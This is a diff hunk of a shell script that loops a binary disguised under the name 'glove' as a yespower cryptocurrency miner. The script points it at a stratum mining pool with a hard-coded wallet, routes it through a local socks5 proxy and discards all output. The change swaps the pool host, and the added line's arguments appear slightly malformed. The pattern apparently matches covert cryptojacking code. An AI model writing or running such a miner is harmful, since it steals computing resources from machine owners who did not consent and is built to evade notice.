@@ -84,7 +84,7 @@ sleep 2
 
 while true
 do
-./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://zpusa.devopsenterprise.uk:6239 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p c=TDC,zap=TDC,$currentdate -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./glove --algo yespower --param-n 2048 --param-r 8 --param-key "" -o stratum+tcp://novagrid.online:3001 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY -p x-t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
 sleep 10
 sleep 10
 done
